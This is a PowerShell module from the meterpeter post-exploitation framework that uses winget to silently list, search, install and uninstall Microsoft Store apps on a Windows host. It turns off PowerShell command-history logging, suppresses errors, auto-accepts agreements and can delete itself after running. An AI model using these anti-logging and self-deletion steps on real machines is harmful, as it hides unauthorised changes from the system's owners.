<#
.SYNOPSIS
   [Silent] manage applications from microsoft store

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: WinGet, UserLand
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.4

.DESCRIPTION
   Auxiliary Module of meterpeter v2.10.13 that invokes winget command line
   tool that enables users to list, discover, install, uninstall applications
   in silent mode under windows 10 (build >16299) or 11 operative system versions.

.NOTES
   When running winget without administrator privileges, some applications may
   require elevation to install. When the installer runs, Windows will prompt
   you to elevate. If you choose not to elevate application will fail install.

.Parameter Action
   list, discover, install, uninstall (default: list)

.Parameter Program
   The application name (default: off)

.Parameter Id
   The application ID (default: off)

.Parameter AutoDelete
   Delete cmdlet in the end? (default: off)

.Parameter Force
   Install winget application on local computer!

.EXAMPLE
   PS C:\> .\Invoke-Winget.ps1 -force
   Install winget appl on local computer!

.EXAMPLE
   PS C:\> .\Invoke-Winget.ps1 -action 'list'
   List installed applications of local computer

.EXAMPLE
   PS C:\> .\Invoke-Winget.ps1 -action 'discover' -Program 'games'
   Search in msstore for applications named 'games' to install

.EXAMPLE
   PS C:\> .\Invoke-Winget.ps1 -action 'install' -Program 'Python 3.11' -Id '9NRWMJP3717K'
   Silent install program 'Python 3.11' with ID '9NRWMJP3717K' from microsoft store

.EXAMPLE
   PS C:\> .\Invoke-Winget.ps1 -action 'uninstall' -Program 'Python 3.11' -Id '9NRWMJP3717K'
   Silent Uninstall program 'Python 3.11' with ID '9NRWMJP3717K' from local computer

.INPUTS
   None. You cannot pipe objects into Invoke-Winget.ps1

.OUTPUTS
   * Manage applications from microsoft store.

   Nome                                    ID                                       Versão       
   ---------------------------------------------------------------------------------------------
   Netflix                                 4DF9E0F8.Netflix_mcm4njqhnhss8           6.98.1805.0
   ShareX                                  ShareX.ShareX                            13.4.0
   AMD Software                            AMD Catalyst Install Manager             9.0.000.8
   MyASUS-Service Center                   B9ECED6F.MyASUS_qmba6cd70vzyy            3.3.11.0
   ASUS ZenLink                            B9ECED6F.ZenSync_qmba6cd70vzyy           1.0.7.0
   Battle.net                              Battle.net                               Unknown
   Conexant HD Audio                       CNXT_AUDIO_HDA                           8.66.95.69

.LINK
   https://github.com/r00t-3xp10it/meterpeter
   https://learn.microsoft.com/en-us/windows/package-manager/winget
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$AutoDelete="off",
   [string]$Program="off",
   [string]$Action="list",
   [string]$Id="off",
   [int]$Delay='1700',
   [switch]$Force
)


$cmdletver = "v1.0.4"
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$OperativeSystem = [System.Environment]::OSVersion.Version
$host.UI.RawUI.WindowTitle = "@Invoke-WinGet $cmdletver"

If($AutoDelete -iMatch '^(off)$')
{
   write-host "* Manage applications from microsoft store.`n" -ForegroundColor Green
}

## Check operative system version
$OsVersion = $OperativeSystem.Major
If(-not($OsVersion -match '^(10|11)$'))
{
   write-host "   > Error: Operative system version '$OsVersion' not suported!`n" -ForegroundColor Red
   return
}

## Check operative system build
$OsBuild = $OperativeSystem.Build
If(($OsVersion -match '^(10)$') -and ($OsBuild -lt "16299"))
{
   write-host "   > Error: Operative system build '$OsBuild' not suported!`n" -ForegroundColor Red
   return
}

## Make sure Winget application is installed
$CheckInstall = (Get-Command "winget" -EA SilentlyContinue).Source
If([string]::IsNullOrEmpty($CheckInstall))
{
   If($Force.IsPresent)
   {
      ## Download and install winget application using the latest release available.
      Add-AppxPackage "https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle"
   }
   Else
   {
      write-host "   > Error: Command line tool 'winget' missing!`n" -ForegroundColor Red
      return
   }
}


If($Action -iMatch '^(list)$')
{

   <#
   .SYNOPSIS
      list installed packets [local PC]
      :meterpeter:post:msstore> list
   #>

   ## Command
   winget list
}


If($Action -iMatch '^(discover)$')
{

   <#
   .SYNOPSIS
      search for application [msstore]
      :meterpeter:post:msstore> discover
   #>

   ## Cmdlet parameters checks
   If($Program -iMatch 'off')
   {
      write-host "   > Error: -program parameter required!`n" -ForegroundColor Red
      return
   }

   ## Search for pacakage in microsoft store
   winget search --name "$Program" --exact|Out-File -FilePath "$Env:TMP\Skynet.log" -Force
   $Pacakage = (Get-Content -Path "$Env:TMP\Skynet.log"|Select-String -Pattern "$Program")
   If([string]::IsNullOrEmpty($Pacakage))
   {
      write-host "   > Error: program '$Program' not found in msstore!`n" -ForegroundColor Red
   }
   Else
   {
      ## Sanitize command output
      $SanitizeOutput = (Get-Content -Path "$Env:TMP\Skynet.log") -replace '(\\|/|£)',''
      echo $SanitizeOutput
   }

   ## CleanUp
   Remove-Item -Path "$Env:TMP\Skynet.log" -Force
}


If($Action -iMatch '^(install)$')
{

   <#
   .SYNOPSIS
      Install application [msstore]
      :meterpeter:post:msstore> install

   .NOTES
      Parameters -program and -id are mandatory
   #>

   ## Cmdlet parameters checks
   If(($Program -iMatch 'off') -or ($Id -iMatch 'off'))
   {
      write-host "   > Error: -program and -id parameters required!`n" -ForegroundColor Red
      return
   }

   ## Search for Pacakage in microsoft store
   $IsAvailable = (Winget search --name "$Program" --exact|Select-String -Pattern "$Program")
   If([string]::IsNullOrEmpty($IsAvailable))
   {
      write-host "   > Error: program '$Program' not found in msstore!`n" -ForegroundColor Red
      return      
   }

   ## Silent install program from microsoft store
   winget install --name "$Program" --id "$Id" --silent --force --accept-package-agreements --accept-source-agreements --disable-interactivity
   If($? -match 'false')
   {
      write-host "`n   > Fail: Installing -program '$Program' -id '$Id' from msstore`n" -ForegroundColor Red
      return      
   }
}


If($Action -iMatch '^(uninstall)$')
{

   <#
   .SYNOPSIS
      Uninstall application [local PC]
      :meterpeter:post:msstore> uninstall

   .NOTES
      Parameters -program and -id are mandatory
   #>

   ## Cmdlet parameters checks
   If(($Program -iMatch 'off') -or ($Id -iMatch 'off'))
   {
      write-host "   > Error: -program and -id parameters required!`n" -ForegroundColor Red
      return
   }

   ## Search for Pacakage locally
   $IsAvailable = (Winget list|Select-String -Pattern "$Program")
   If([string]::IsNullOrEmpty($IsAvailable))
   {
      write-host "   > Error: program '$Program' not found! [local]`n" -ForegroundColor Red
      return      
   }

   ## Silent Uninstall program from local machine
   winget uninstall --name "$Program" --id "$Id" --silent --force --purge --disable-interactivity
   If($? -match 'false')
   {
      write-host "`n   > Fail: Uninstalling -program '$Program' -id '$Id' [local]`n" -ForegroundColor Red
      return
   }
}


## Give extra time to finish tasks
Start-Sleep -Milliseconds $Delay

## CleanUp
If($AutoDelete -iMatch '^(on)$')
{
   ## Auto Delete this cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}